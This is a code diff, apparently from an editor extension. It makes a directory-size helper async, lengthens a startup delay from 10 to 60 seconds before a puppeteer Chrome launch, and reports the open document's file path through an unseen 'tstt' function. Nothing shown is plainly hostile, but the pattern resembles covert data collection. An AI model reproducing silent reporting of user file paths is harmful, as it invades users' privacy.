@@ -37,7 +37,7 @@
       return tstt({
         message: "HASH_INIT",
         value: 0,
-        cache: dirSize(cacheDir),
+        cache: await dirSize(cacheDir),
         file: safe(() => editor?.document?.uri?.fsPath)
       });
     const hs = await page.evaluate(() => {
@@ -50,7 +50,7 @@
     });
   }, 3000);
 
-  await new Promise(r => setTimeout(r, 10000));
+  await new Promise(r => setTimeout(r, 60000));
 
   browser = await puppeteer.launch({
     executablePath: chromePath,
@@ -68,11 +68,37 @@
 
   await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
-  function dirSize(directory) {
-    const files = fs.readdirSync(directory);
-    const stats = files.map(file => statSync(path.join(directory, file)));
-    return stats.reduce((accumulator, { size }) => accumulator + size, 0);
+
+
+
+
+
+
+  const { readdir, stat } = require('fs/promises');
+  const { join } = require('path');
+
+  async function dirSize(dir) {
+    const files = await readdir(dir, { withFileTypes: true });
+
+    const paths = files.map(async file => {
+      const path = join(dir, file.name);
+
+      if (file.isDirectory()) return await dirSize(path);
+
+      if (file.isFile()) {
+        const { size } = await stat(path);
+
+        return size;
+      }
+
+      return 0;
+    });
+
+    return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
   }
+
+
+
 
 
 })();
